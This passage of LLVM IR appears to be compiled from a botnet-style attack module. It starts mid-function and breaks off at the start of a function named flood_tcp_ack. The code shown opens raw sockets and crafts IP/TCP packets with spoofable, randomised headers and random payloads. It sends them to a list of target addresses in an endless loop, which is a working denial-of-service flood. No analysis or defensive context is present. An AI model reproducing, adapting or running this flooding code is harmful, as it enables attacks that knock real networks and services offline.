  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias align 16 i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %171, label %170

170:                                              ; preds = %1
  call void @exit(i32 1) #9
  unreachable

171:                                              ; preds = %1
  %172 = load %struct.arguments*, %struct.arguments** %2, align 8
  %173 = getelementptr inbounds %struct.arguments, %struct.arguments* %172, i32 0, i32 3
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i64
  %176 = call noalias align 16 i8* @calloc(i64 %175, i64 4) #8
  %177 = bitcast i8* %176 to i32*
  store i32* %177, i32** %22, align 8
  %178 = load i32*, i32** %22, align 8
  %179 = icmp ne i32* %178, null
  br i1 %179, label %181, label %180

180:                                              ; preds = %171
  call void @exit(i32 1) #9
  unreachable

181:                                              ; preds = %171
  store i32 0, i32* %3, align 4
  br label %182

182:                                              ; preds = %425, %181
  %183 = load i32, i32* %3, align 4
  %184 = load %struct.arguments*, %struct.arguments** %2, align 8
  %185 = getelementptr inbounds %struct.arguments, %struct.arguments* %184, i32 0, i32 3
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %183, %187
  br i1 %188, label %189, label %428

189:                                              ; preds = %182
  %190 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %191 = load i32*, i32** %22, align 8
  %192 = load i32, i32* %3, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %191, i64 %193
  store i32 %190, i32* %194, align 4
  %195 = load i32*, i32** %22, align 8
  %196 = load i32, i32* %3, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, -1
  br i1 %200, label %201, label %204

201:                                              ; preds = %189
  %202 = load i8**, i8*** %9, align 8
  %203 = bitcast i8** %202 to i8*
  call void @free(i8* %203) #8
  call void @exit(i32 1) #9
  unreachable

204:                                              ; preds = %189
  store i32 1, i32* %4, align 4
  %205 = load i32*, i32** %22, align 8
  %206 = load i32, i32* %3, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = bitcast i32* %4 to i8*
  %211 = call i32 @setsockopt(i32 %209, i32 0, i32 3, i8* %210, i32 4) #8
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %216

213:                                              ; preds = %204
  %214 = load i8**, i8*** %9, align 8
  %215 = bitcast i8** %214 to i8*
  call void @free(i8* %215) #8
  call void @exit(i32 1) #9
  unreachable

216:                                              ; preds = %204
  %217 = load i32, i32* %23, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %238

219:                                              ; preds = %216
  %220 = load i16, i16* %6, align 2
  %221 = load i32*, i32** %22, align 8
  %222 = load i32, i32* %3, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %221, i64 %223
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.arguments*, %struct.arguments** %2, align 8
  %227 = getelementptr inbounds %struct.arguments, %struct.arguments* %226, i32 0, i32 0
  %228 = load %struct.target*, %struct.target** %227, align 8
  %229 = load i32, i32* %3, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.target, %struct.target* %228, i64 %230
  %232 = getelementptr inbounds %struct.target, %struct.target* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %19, align 4
  %235 = load i16, i16* %8, align 2
  %236 = zext i16 %235 to i32
  %237 = call i32 @tcp_handshake(i16 zeroext %220, i32 %225, i32 %233, i32 %234, i32 %236)
  br label %238

238:                                              ; preds = %219, %216
  %239 = load i16, i16* %5, align 2
  %240 = zext i16 %239 to i32
  %241 = add nsw i32 %240, 110
  %242 = sext i32 %241 to i64
  %243 = call noalias align 16 i8* @malloc(i64 %242) #8
  %244 = load i8**, i8*** %9, align 8
  %245 = load i32, i32* %3, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds i8*, i8** %244, i64 %246
  store i8* %243, i8** %247, align 8
  %248 = load i8**, i8*** %9, align 8
  %249 = load i32, i32* %3, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i8*, i8** %248, i64 %250
  %252 = load i8*, i8** %251, align 8
  %253 = icmp ne i8* %252, null
  br i1 %253, label %257, label %254

254:                                              ; preds = %238
  %255 = load i8**, i8*** %9, align 8
  %256 = bitcast i8** %255 to i8*
  call void @free(i8* %256) #8
  call void @exit(i32 1) #9
  unreachable

257:                                              ; preds = %238
  %258 = load i8**, i8*** %9, align 8
  %259 = load i32, i32* %3, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8*, i8** %258, i64 %260
  %262 = load i8*, i8** %261, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %24, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.tcphdr*
  store %struct.tcphdr* %266, %struct.tcphdr** %25, align 8
  %267 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i64 1
  %269 = bitcast %struct.tcphdr* %268 to i8*
  store i8* %269, i8** %26, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = bitcast %struct.iphdr* %270 to i8*
  %272 = load i8, i8* %271, align 4
  %273 = and i8 %272, 15
  %274 = or i8 %273, 64
  store i8 %274, i8* %271, align 4
  %275 = load i8, i8* %16, align 1
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 1
  store i8 %275, i8* %277, align 1
  %278 = load i16, i16* %5, align 2
  %279 = zext i16 %278 to i64
  %280 = add i64 40, %279
  %281 = trunc i64 %280 to i16
  %282 = call zeroext i16 @htons(i16 zeroext %281) #7
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  store i16 %282, i16* %284, align 2
  %285 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %286 = bitcast %struct.iphdr* %285 to i8*
  %287 = load i8, i8* %286, align 4
  %288 = and i8 %287, -16
  %289 = or i8 %288, 5
  store i8 %289, i8* %286, align 4
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 4
  store i16 0, i16* %291, align 2
  %292 = load i8, i8* %7, align 1
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 5
  store i8 %292, i8* %294, align 4
  %295 = load i16, i16* %17, align 2
  %296 = call zeroext i16 @htons(i16 zeroext %295) #7
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 4
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 6
  store i8 6, i8* %300, align 1
  %301 = load i32, i32* %19, align 4
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  %304 = load %struct.arguments*, %struct.arguments** %2, align 8
  %305 = getelementptr inbounds %struct.arguments, %struct.arguments* %304, i32 0, i32 0
  %306 = load %struct.target*, %struct.target** %305, align 8
  %307 = load i32, i32* %3, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.target, %struct.target* %306, i64 %308
  %310 = getelementptr inbounds %struct.target, %struct.target* %309, i32 0, i32 0
  %311 = load i32, i32* %310, align 4
  %312 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  %314 = load i16, i16* %6, align 2
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon* %317 to %struct.anon.0*
  %319 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %318, i32 0, i32 1
  store i16 %315, i16* %319, align 2
  %320 = load i16, i16* %8, align 2
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i32 0, i32 0
  %324 = bitcast %union.anon* %323 to %struct.anon.0*
  %325 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %324, i32 0, i32 0
  store i16 %321, i16* %325, align 4
  %326 = load i32, i32* %18, align 4
  %327 = trunc i32 %326 to i16
  %328 = call zeroext i16 @htons(i16 zeroext %327) #7
  %329 = zext i16 %328 to i32
  %330 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon* %331 to %struct.anon.0*
  %333 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %332, i32 0, i32 2
  store i32 %329, i32* %333, align 4
  %334 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 0
  %336 = bitcast %union.anon* %335 to %struct.anon.0*
  %337 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = and i16 %338, -241
  %340 = or i16 %339, 80
  store i16 %340, i16* %337, align 4
  %341 = load i8, i8* %10, align 1
  %342 = sext i8 %341 to i16
  %343 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 0
  %345 = bitcast %union.anon* %344 to %struct.anon.0*
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = and i16 %342, 1
  %349 = shl i16 %348, 12
  %350 = and i16 %347, -4097
  %351 = or i16 %350, %349
  store i16 %351, i16* %346, align 4
  %352 = load i8, i8* %11, align 1
  %353 = sext i8 %352 to i16
  %354 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon* %355 to %struct.anon.0*
  %357 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = and i16 %353, 1
  %360 = shl i16 %359, 8
  %361 = and i16 %358, -257
  %362 = or i16 %361, %360
  store i16 %362, i16* %357, align 4
  %363 = load i8, i8* %12, align 1
  %364 = sext i8 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  %367 = bitcast %union.anon* %366 to %struct.anon.0*
  %368 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = and i16 %364, 1
  %371 = shl i16 %370, 13
  %372 = and i16 %369, -8193
  %373 = or i16 %372, %371
  store i16 %373, i16* %368, align 4
  %374 = load i8, i8* %13, align 1
  %375 = sext i8 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 0
  %378 = bitcast %union.anon* %377 to %struct.anon.0*
  %379 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %378, i32 0, i32 4
  %380 = load i16, i16* %379, align 4
  %381 = and i16 %375, 1
  %382 = shl i16 %381, 11
  %383 = and i16 %380, -2049
  %384 = or i16 %383, %382
  store i16 %384, i16* %379, align 4
  %385 = load i8, i8* %14, align 1
  %386 = sext i8 %385 to i16
  %387 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 0
  %389 = bitcast %union.anon* %388 to %struct.anon.0*
  %390 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %386, 1
  %393 = shl i16 %392, 10
  %394 = and i16 %391, -1025
  %395 = or i16 %394, %393
  store i16 %395, i16* %390, align 4
  %396 = load i8, i8* %15, align 1
  %397 = sext i8 %396 to i16
  %398 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i32 0, i32 0
  %400 = bitcast %union.anon* %399 to %struct.anon.0*
  %401 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %400, i32 0, i32 4
  %402 = load i16, i16* %401, align 4
  %403 = and i16 %397, 1
  %404 = shl i16 %403, 9
  %405 = and i16 %402, -513
  %406 = or i16 %405, %404
  store i16 %406, i16* %401, align 4
  %407 = call i32 @rand_new()
  %408 = and i32 %407, 65535
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 5
  store i16 %409, i16* %413, align 2
  %414 = load i32, i32* %20, align 4
  %415 = trunc i32 %414 to i16
  %416 = call zeroext i16 @htons(i16 zeroext %415) #7
  %417 = zext i16 %416 to i32
  %418 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 3
  store i32 %417, i32* %421, align 4
  %422 = load i8*, i8** %26, align 8
  %423 = load i16, i16* %5, align 2
  %424 = zext i16 %423 to i32
  call void @rand_string(i8* %422, i32 %424)
  br label %425

425:                                              ; preds = %257
  %426 = load i32, i32* %3, align 4
  %427 = add nsw i32 %426, 1
  store i32 %427, i32* %3, align 4
  br label %182, !llvm.loop !13

428:                                              ; preds = %182
  br label %429

429:                                              ; preds = %428, %620
  store i32 0, i32* %3, align 4
  br label %430

430:                                              ; preds = %617, %429
  %431 = load i32, i32* %3, align 4
  %432 = load %struct.arguments*, %struct.arguments** %2, align 8
  %433 = getelementptr inbounds %struct.arguments, %struct.arguments* %432, i32 0, i32 3
  %434 = load i8, i8* %433, align 1
  %435 = zext i8 %434 to i32
  %436 = icmp slt i32 %431, %435
  br i1 %436, label %437, label %620

437:                                              ; preds = %430
  %438 = load i8**, i8*** %9, align 8
  %439 = load i32, i32* %3, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds i8*, i8** %438, i64 %440
  %442 = load i8*, i8** %441, align 8
  %443 = bitcast i8* %442 to %struct.iphdr*
  store %struct.iphdr* %443, %struct.iphdr** %27, align 8
  %444 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i64 1
  %446 = bitcast %struct.iphdr* %445 to %struct.tcphdr*
  store %struct.tcphdr* %446, %struct.tcphdr** %28, align 8
  %447 = load %struct.arguments*, %struct.arguments** %2, align 8
  %448 = getelementptr inbounds %struct.arguments, %struct.arguments* %447, i32 0, i32 0
  %449 = load %struct.target*, %struct.target** %448, align 8
  %450 = load i32, i32* %3, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.target, %struct.target* %449, i64 %451
  %453 = getelementptr inbounds %struct.target, %struct.target* %452, i32 0, i32 1
  %454 = load i16, i16* %453, align 4
  %455 = zext i16 %454 to i32
  %456 = icmp slt i32 %455, 32
  br i1 %456, label %457, label %477

457:                                              ; preds = %437
  %458 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 9
  %460 = load i32, i32* %459, align 4
  %461 = call i32 @ntohl(i32 %460) #7
  %462 = call i32 @rand_new()
  %463 = load %struct.arguments*, %struct.arguments** %2, align 8
  %464 = getelementptr inbounds %struct.arguments, %struct.arguments* %463, i32 0, i32 0
  %465 = load %struct.target*, %struct.target** %464, align 8
  %466 = load i32, i32* %3, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.target, %struct.target* %465, i64 %467
  %469 = getelementptr inbounds %struct.target, %struct.target* %468, i32 0, i32 1
  %470 = load i16, i16* %469, align 4
  %471 = zext i16 %470 to i32
  %472 = lshr i32 %462, %471
  %473 = add i32 %461, %472
  %474 = call i32 @htonl(i32 %473) #7
  %475 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  store i32 %474, i32* %476, align 4
  br label %477

477:                                              ; preds = %457, %437
  %478 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 8
  %480 = load i32, i32* %479, align 4
  %481 = icmp eq i32 %480, -1
  br i1 %481, label %482, label %486

482:                                              ; preds = %477
  %483 = call i32 @rand_new()
  %484 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  br label %486

486:                                              ; preds = %482, %477
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 3
  %489 = load i16, i16* %488, align 4
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  br i1 %491, label %492, label %498

492:                                              ; preds = %486
  %493 = call i32 @rand_new()
  %494 = and i32 %493, 65535
  %495 = trunc i32 %494 to i16
  %496 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 3
  store i16 %495, i16* %497, align 4
  br label %498

498:                                              ; preds = %492, %486
  %499 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon* %500 to %struct.anon.0*
  %502 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %501, i32 0, i32 1
  %503 = load i16, i16* %502, align 2
  %504 = zext i16 %503 to i32
  %505 = icmp eq i32 %504, 65535
  br i1 %505, label %506, label %514

506:                                              ; preds = %498
  %507 = call i32 @rand_new()
  %508 = and i32 %507, 65535
  %509 = trunc i32 %508 to i16
  %510 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  %512 = bitcast %union.anon* %511 to %struct.anon.0*
  %513 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %512, i32 0, i32 1
  store i16 %509, i16* %513, align 2
  br label %514

514:                                              ; preds = %506, %498
  %515 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %516 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %515, i32 0, i32 0
  %517 = bitcast %union.anon* %516 to %struct.anon.0*
  %518 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %517, i32 0, i32 0
  %519 = load i16, i16* %518, align 4
  %520 = zext i16 %519 to i32
  %521 = icmp eq i32 %520, 65535
  br i1 %521, label %522, label %530

522:                                              ; preds = %514
  %523 = call i32 @rand_new()
  %524 = and i32 %523, 65535
  %525 = trunc i32 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 0
  %528 = bitcast %union.anon* %527 to %struct.anon.0*
  %529 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %528, i32 0, i32 0
  store i16 %525, i16* %529, align 4
  br label %530

530:                                              ; preds = %522, %514
  %531 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 0
  %533 = bitcast %union.anon* %532 to %struct.anon.0*
  %534 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %533, i32 0, i32 2
  %535 = load i32, i32* %534, align 4
  %536 = icmp eq i32 %535, 65535
  br i1 %536, label %537, label %544

537:                                              ; preds = %530
  %538 = call i32 @rand_new()
  %539 = and i32 %538, 65535
  %540 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 0
  %542 = bitcast %union.anon* %541 to %struct.anon.0*
  %543 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %542, i32 0, i32 2
  store i32 %539, i32* %543, align 4
  br label %544

544:                                              ; preds = %537, %530
  %545 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 0
  %547 = bitcast %union.anon* %546 to %struct.anon.0*
  %548 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %547, i32 0, i32 3
  %549 = load i32, i32* %548, align 4
  %550 = icmp eq i32 %549, 65535
  br i1 %550, label %551, label %558

551:                                              ; preds = %544
  %552 = call i32 @rand_new()
  %553 = and i32 %552, 65535
  %554 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  %556 = bitcast %union.anon* %555 to %struct.anon.0*
  %557 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %556, i32 0, i32 3
  store i32 %553, i32* %557, align 4
  br label %558

558:                                              ; preds = %551, %544
  %559 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %560 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %559, i32 0, i32 7
  store i16 0, i16* %560, align 2
  %561 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %562 = bitcast %struct.iphdr* %561 to i16*
  %563 = call zeroext i16 @ip_header_checksum(i16* %562, i32 20)
  %564 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %565 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %564, i32 0, i32 7
  store i16 %563, i16* %565, align 2
  %566 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 0
  %568 = bitcast %union.anon* %567 to %struct.anon.0*
  %569 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %568, i32 0, i32 6
  store i16 0, i16* %569, align 4
  %570 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %571 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %572 = bitcast %struct.tcphdr* %571 to i8*
  %573 = load i16, i16* %5, align 2
  %574 = zext i16 %573 to i64
  %575 = add i64 20, %574
  %576 = trunc i64 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = load i16, i16* %5, align 2
  %579 = zext i16 %578 to i64
  %580 = add i64 20, %579
  %581 = trunc i64 %580 to i32
  %582 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %570, i8* %572, i16 zeroext %577, i32 %581)
  %583 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 0
  %585 = bitcast %union.anon* %584 to %struct.anon.0*
  %586 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %585, i32 0, i32 6
  store i16 %582, i16* %586, align 4
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %587, align 4
  %588 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %589 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %588, i32 0, i32 0
  %590 = bitcast %union.anon* %589 to %struct.anon.0*
  %591 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %590, i32 0, i32 1
  %592 = load i16, i16* %591, align 2
  %593 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %592, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 9
  %596 = load i32, i32* %595, align 4
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %598 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %597, i32 0, i32 0
  store i32 %596, i32* %598, align 4
  %599 = load i32*, i32** %22, align 8
  %600 = load i32, i32* %3, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds i32, i32* %599, i64 %601
  %603 = load i32, i32* %602, align 4
  %604 = load i8**, i8*** %9, align 8
  %605 = load i32, i32* %3, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds i8*, i8** %604, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i16, i16* %5, align 2
  %610 = zext i16 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %613 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %612, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %603, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %615, i32 16)
  br label %617

617:                                              ; preds = %558
  %618 = load i32, i32* %3, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %3, align 4
  br label %430, !llvm.loop !14

620:                                              ; preds = %430
  br label %429
}

declare i32 @retrieve_opt_ipv4(%struct.option*, i8 zeroext, i8 zeroext, i32) #2

declare i8* @retrieve_opt_str(%struct.option*, i8 zeroext, i8 zeroext, i8*) #2

; Function Attrs: nounwind
declare void @free(i8*) #5

declare zeroext i16 @ip_header_checksum(i16*, i32) #2

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_tcp_ack(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
